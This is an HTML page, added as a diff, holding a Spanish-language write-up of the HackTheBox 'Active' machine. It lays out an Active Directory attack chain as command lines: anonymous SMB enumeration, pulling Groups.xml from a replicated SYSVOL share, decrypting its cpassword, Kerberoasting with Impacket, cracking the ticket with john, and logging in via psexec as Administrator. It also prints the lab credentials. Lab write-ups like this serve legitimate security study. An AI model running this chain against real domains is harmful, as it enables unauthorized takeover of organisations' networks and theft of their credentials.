@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png" />
+    <title>RuyzTz7 | Active HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/active/pasted-20251118122146.png" alt="Active HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Active</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>kerberoasting</span>
+            <span>cpassword</span>
+            <span>groups_xml</span>
+            <span>active_directory</span>
+            <span>sysvol</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SMB Anónimo</li>
+            <li><code>Explotación</code>: <code>SYSVOL</code> -> Groups.xml -> cpassword</li>
+            <li><code>Escalada Privilegios</code>: <code>Kerberoasting</code></li>
+          </ul>
+        </section>
+
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/active/pasted-20251118124134.png" alt="Enumeración SMB de Active" />
+        </section>
+
+        <section class="writeup-section">
+          <h2>Explotación: SMB Anónimo -> SYSVOL</h2>
+          <div class="code-card">
+            <h3>Enumerar shares sin credenciales</h3>
+            <pre><code>netexec smb active -u '' -p '' --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/active/pasted-20251118171047.png" alt="Shares SMB sin credenciales" />
+
+          <div class="code-card">
+            <h3>Descargar todo el contenido del recurso Replication</h3>
+            <pre><code>smbclient -N //active/Replication/ -c "recurse; prompt; mget *;"</code></pre>
+          </div>
+          <p>El recurso <code>Replication</code> tiene una estructura similar a la de <code>SYSVOL</code> con el fichero <code>Groups.xml</code>.</p>
+          <img class="writeup-image" src="/writeups/assets/active/pasted-20260224141025.png" alt="Groups.xml en Replication" />
+
+          <div class="code-card">
+            <h3>Crackear cpassword con gpp-decrypt</h3>
+            <pre><code>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+# Obtenemos credenciales del dominio
+SVC_TGS:GPPstillStandingStrong2k18</code></pre>
+          </div>
+        </section>
+
+        <section class="writeup-section">
+          <h2>Escalada Privilegios: Kerberoasting</h2>
+          <div class="code-card">
+            <h3>Kerberoasting</h3>
+            <pre><code>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/active/pasted-20260127220240.png" alt="Kerberoasting en Active" />
+
+          <div class="code-card">
+            <h3>Crackeamos el TGS (Hash)</h3>
+            <pre><code># Obtenemos un TGS Aministrator
+john -w:$(locate rockyou.txt) hash
+
+# Password -> Ticketmaster1968
+Administrator:Ticketmaster1968</code></pre>
+          </div>
+
+          <div class="code-card">
+            <h3>Acceder con psexec con las credenciales Administrator:Ticketmaster1968</h3>
+            <pre><code>psexec Administrator@active</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/active/pasted-20251118161341.png" alt="Acceso como Administrator en Active" />
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
